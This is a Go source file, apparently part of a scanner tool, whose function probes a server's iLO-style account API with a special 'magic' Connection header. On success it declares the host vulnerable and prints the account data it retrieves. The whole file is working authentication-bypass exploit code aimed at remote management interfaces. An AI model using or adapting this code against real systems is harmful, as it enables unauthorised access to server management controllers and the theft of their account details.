package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"gopkg.in/alecthomas/kingpin.v2"
)

func iloScan(_ *kingpin.ParseContext) error {
	accounts := Accounts{}
	req, err := http.NewRequest("GET",
		fmt.Sprintf("https://%s/rest/v1/AccountService/Accounts", addr),
		nil,
	)

	if err != nil {
		fmt.Print(err)
	}

	req.Header.Add("Connection", magic)

	response, err := client.Do(req)
	if err != nil {
		fmt.Print(err)
	}

	// If we don't get a HTTP 200 resp
	if response.StatusCode == 401 {
		fmt.Printf("[+] %s is not vulnerable\n", addr)
		return nil
	} else if response.StatusCode != 200 {
		fmt.Printf("[+] Error connecting to %s: %s\n", addr, response.Body)
		return nil
	}

	fmt.Printf("[+] %s is VULNERABLE\n", addr)
	fmt.Printf("[+] Printing account information:\n")
	b, _ := ioutil.ReadAll(response.Body)

	if err := json.Unmarshal(b, &accounts); err != nil {
		fmt.Print(err)
	}

	accounts.Print()

	return nil
}
